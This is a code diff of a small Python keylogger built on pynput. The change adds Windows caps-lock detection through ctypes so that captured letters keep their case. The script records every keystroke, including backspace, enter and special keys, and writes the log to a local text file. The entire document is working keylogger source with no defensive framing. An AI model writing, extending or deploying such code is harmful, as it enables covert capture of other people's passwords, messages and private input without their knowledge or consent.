@@ -1,26 +1,38 @@
 from pynput import keyboard
+import ctypes
 
-words = []
+text = []
 
 
-def on_key_press(key):
+def caps_lock():
+    # 0x14 is virtual key code of caps lock button, it returns 1 when caps lock is in opened state
+    return ctypes.windll.user32.GetKeyState(0x14) & 1
+
+
+def on_press(key):
+    caps_state = caps_lock()
     try:
         char = key.char
-        words.append(char)
+        if caps_state:
+            text.append(char.casefold().upper())
+        else:
+            text.append(char.casefold().lower())
 
     except AttributeError:
         if key == keyboard.Key.backspace:
-            if words:
-                words.pop()
+            if text:
+                text.pop()
         elif key == keyboard.Key.enter:
-            words.append("\n")
+            text.append("\n")
 
         elif key == keyboard.Key.space:
-            words.append(" ")
+            text.append(" ")
         elif key == keyboard.Key.tab:
-            words.append("\t")
+            text.append("\t")
+        elif key == keyboard.Key.caps_lock:
+            pass
         else:
-            words.append("\n" + str(key) + "\n")
+            text.append("\n" + str(key) + "\n")
 
 
 def on_release(key):
@@ -28,7 +40,7 @@ def on_release(key):
         return False
 
 
-with keyboard.Listener(on_press=on_key_press, on_release=on_release) as listener:
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
 with open("keyboard_entries.txt", "w") as file:
-    file.write("".join(words))
+    file.write("".join(text))
